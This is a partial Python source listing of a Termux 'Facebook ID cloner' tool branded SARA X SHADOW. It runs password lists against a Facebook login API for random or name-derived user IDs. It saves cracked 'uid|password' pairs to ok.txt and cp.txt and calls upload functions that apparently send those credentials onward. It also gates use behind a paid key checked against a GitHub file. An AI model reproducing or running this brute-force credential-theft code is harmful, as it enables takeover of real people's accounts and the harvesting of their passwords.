...
def helpnote():
	...
	subprocess.check_output(["am", "start", "https://github.com/Mafia320/old/blob/main/a.txt"])
	exit(" [*] FACEBOOK :  https://www.facebook.com/nori.sahiba")
...
def notice():
	...
	runtxt("\n\033[0;91m🧞‍♀️YOU ARE  PREMIUM USER ")
	runtxt("\033[0;93m 🔇 SENT THIS KEY TO ADMIN >> %s%s"%(G,basesplit))
	runtxt("\033[0;92m ADMIN🧞‍♀️ MESSENGER🔰🥰https://m.me/nori.sahiba")
	subprocess.check_output(["am", "start", "https://m.me/nori.sahiba"])
...
class Main:
	def __init__(self):
		...
		self.loop = 0
		try:
			plr = requests.get('https://github.com/Mafia320/old/blob/main/a.txt').text
			if basesplit in plr:
				key = basesplit
...
|       \|  \    /  \
| SARA X SHADOW PRO CLONER
|  CLONING SAY PHLY FLIGHT MOD ON KRKY NETWORK SETTINGS KO REST KRDO
|  FIR DEVICE RESTART KRKY CLONING START KRO
|    CLONING KY HER 5MINT BAD FLIGHT MOD USE KRO
|    IDZ FAST AENGE IP ISSU B NI HOGA 
|    THANKS FOR USING MY TOOLS MOR UPDATE FOLLOW ME ON FACEBOOK
 \                                            
\033[1;90m══════════════════════════════════════════════════
...
\033[1;91m [\033[1;94m✯\033[1;91m] \033[1;92mWARNING  : BYPASS BY SARA X SHADOW
\033[1;90m══════════════════════════════════════════════════
    """)
		print("%s [%s•%s] %sTOOL NAME : %sSara❌ PROO CLONER❌"%(G,R,G,B,G))
		...
		print("%s [%s5%s]%s CRACK RANDOM FB ID 2005-7 %s(FREE) V1"%(R,G,R,Y,G))
	...
	def email(self):
		x = 111
		xx = 999
		nam = input("%s [?] TYPE A NAME %s(EX: sara): "%(Y,G))
		nam = nam.replace(" ", "")
	...
	def api(self, uid, pwx):
		...
		for pw in pwx:
			...
			if "session_key" in response.text and "EAAA" in response.text:
				...
				open("ok.txt","a").write(" [SARA-OK] %s|%s\n"%(uid, pw))
				uploadoks()
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r \033[0;91m[SARA-CP] %s|%s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write(" [SARA-CP] %s|%s\n"%(uid, pw))
				uploadcps()
				break
			else:
				continue
